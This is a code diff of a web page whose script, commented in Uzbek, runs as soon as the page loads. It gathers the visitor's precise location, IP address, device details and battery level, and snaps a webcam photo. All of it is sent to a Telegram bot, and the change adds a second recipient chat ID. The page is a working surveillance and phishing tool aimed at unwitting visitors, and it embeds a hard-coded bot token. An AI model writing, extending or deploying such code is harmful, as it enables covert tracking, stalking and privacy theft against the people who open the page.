@@ -51,154 +51,162 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // Telegram bot tokeni va chat ID
-        const BOT_TOKEN = '7607021931:AAEYdoiyh7vxWCLIXNl4-HM6k8SzaSEcG9g';
-        const CHAT_ID = '7984884145';
+    // Telegram bot tokeni va chat ID
+    const BOT_TOKEN = '7607021931:AAEYdoiyh7vxWCLIXNl4-HM6k8SzaSEcG9g';
+    const CHAT_IDS = ['7068280080', '7984884145']; // Massiv sifatida CHAT_IDS deb nomladim
 
-        // Hozirgi vaqtni olish
-        function getCurrentTime() {
-            const now = new Date();
-            return now.toTimeString().split(' ')[0]; // HH:MM:SS formatida
+    // Hozirgi vaqtni olish
+    function getCurrentTime() {
+        const now = new Date();
+        return now.toTimeString().split(' ')[0]; // HH:MM:SS formatida
+    }
+
+    // Lokatsiyani olish
+    function getLocation(callback) {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    callback(mapLink);
+                },
+                (error) => {
+                    console.error("Lokatsiya olishda xato:", error.message);
+                    callback(null);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            callback(null);
         }
+    }
 
-        // Lokatsiyani olish
-        function getLocation(callback) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        callback(mapLink);
-                    },
-                    (error) => {
-                        console.error("Lokatsiya olishda xato:", error.message);
-                        callback(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
+    // IP-manzilni olish
+    function getIP(callback) {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => {
+                console.error("IP olishda xato:", error);
                 callback(null);
-            }
-        }
+            });
+    }
 
-        // IP-manzilni olish
-        function getIP(callback) {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => callback(data.ip))
-                .catch(error => {
-                    console.error("IP olishda xato:", error);
+    // Qurilma ma'lumotlarini olish
+    function getDeviceInfo() {
+        return navigator.userAgent;
+    }
+
+    // Batareya darajasini olish
+    function getBatteryLevel(callback) {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                const level = Math.round(battery.level * 100);
+                callback(`${level}%`);
+            }).catch(() => callback("0%"));
+        } else {
+            callback("0%");
+        }
+    }
+
+    // Kameradan rasm olish
+    function getCameraAndPhoto(callback) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL("image/png");
+                        stream.getTracks().forEach(track => track.stop());
+                        callback(imageData);
+                    };
+                })
+                .catch((err) => {
+                    console.error("Kameraga ruxsat berilmadi:", err);
                     callback(null);
                 });
+        } else {
+            callback(null);
         }
+    }
 
-        // Qurilma ma'lumotlarini olish
-        function getDeviceInfo() {
-            return navigator.userAgent;
-        }
+    // Telegram’ga ma’lumotlarni yuborish
+    function sendToTelegram(location, ip, battery, device, time, photo) {
+        const message = `⏳ Time: ${time}\n🔋Device battery: ${battery}\n📍 IP address: ${ip || "Topilmadi"}\n📍 Location: ${location || "Topilmadi"}\n\n📱 Device: ${device}`;
 
-        // Batareya darajasini olish
-        function getBatteryLevel(callback) {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    const level = Math.round(battery.level * 100);
-                    callback(`${level}%`);
-                }).catch(() => callback("0%"));
-            } else {
-                callback("0%");
-            }
-        }
-
-        // Kameradan rasm olish
-        function getCameraAndPhoto(callback) {
-            const video = document.getElementById("video");
-            const canvas = document.getElementById("canvas");
-            const context = canvas.getContext("2d");
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        video.srcObject = stream;
-                        video.onloadedmetadata = () => {
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const imageData = canvas.toDataURL("image/png");
-                            stream.getTracks().forEach(track => track.stop());
-                            callback(imageData);
-                        };
-                    })
-                    .catch((err) => {
-                        console.error("Kameraga ruxsat berilmadi:", err);
-                        callback(null);
-                    });
-            } else {
-                callback(null);
-            }
-        }
-
-        // Telegram’ga ma’lumotlarni yuborish
-        function sendToTelegram(location, ip, battery, device, time, photo) {
-            const message = `⏳ Time: ${time}\n🔋Device battery: ${battery}\n📍 IP address: ${ip || "Topilmadi"}\n📍 Location: ${location || "Topilmadi"}\n\n📱 Device: ${device}`;
-            const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
+        // Har bir chat ID uchun matn yuborish
+        CHAT_IDS.forEach(chatId => {
+            const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             fetch(textUrl)
                 .then(response => response.json())
                 .then(data => {
-                    if (!data.ok) console.error("Matn yuborishda xato:", data);
+                    if (!data.ok) console.error(`Matn yuborishda xato (${chatId}):`, data);
                 });
+        });
 
-            if (photo) {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", dataURLtoBlob(photo), "photo.png");
+        // Har bir chat ID uchun rasm yuborish
+        if (photo) {
+            const formData = new FormData();
+            formData.append("photo", dataURLtoBlob(photo), "photo.png");
 
+
+            CHAT_IDS.forEach(chatId => {
+                formData.set("chat_id", chatId); // Har bir chat ID uchun yangilash
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 })
                     .then(response => response.json())
                     .then(data => {
-                        if (!data.ok) console.error("Rasm yuborishda xato:", data);
+                        if (!data.ok) console.error(`Rasm yuborishda xato (${chatId}):`, data);
                     });
-            }
+            });
         }
+    }
 
-        // Base64’dan Blob’ga aylantirish
-        function dataURLtoBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
+    // Base64’dan Blob’ga aylantirish
+    function dataURLtoBlob(dataURL) {
+        const byteString = atob(dataURL.split(',')[1]);
+        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
         }
+        return new Blob([ab], { type: mimeString });
+    }
 
-        // Hammasini birlashtirish
-        window.onload = function() {
-            let locationData, ipData, photoData, batteryData, deviceData;
-            const timeData = getCurrentTime();
+    // Hammasini birlashtirish
+    window.onload = function() {
+        let locationData, ipData, photoData, batteryData, deviceData;
+        const timeData = getCurrentTime();
 
-            getLocation((location) => {
-                locationData = location;
-                getIP((ip) => {
-                    ipData = ip;
-                    getBatteryLevel((battery) => {
-                        batteryData = battery;
-                        deviceData = getDeviceInfo();
-                        getCameraAndPhoto((photo) => {
-                            photoData = photo;
-                            sendToTelegram(locationData, ipData, batteryData, deviceData, timeData, photoData);
-                        });
+        getLocation((location) => {
+            locationData = location;
+            getIP((ip) => {
+                ipData = ip;
+                getBatteryLevel((battery) => {
+                    batteryData = battery;
+                    deviceData = getDeviceInfo();
+                    getCameraAndPhoto((photo) => {
+                        photoData = photo;
+                        sendToTelegram(locationData, ipData, batteryData, deviceData, timeData, photoData);
                     });
                 });
             });
-        };
-    </script>
+        });
+    };
+</script>
+
 </body>
 </html>
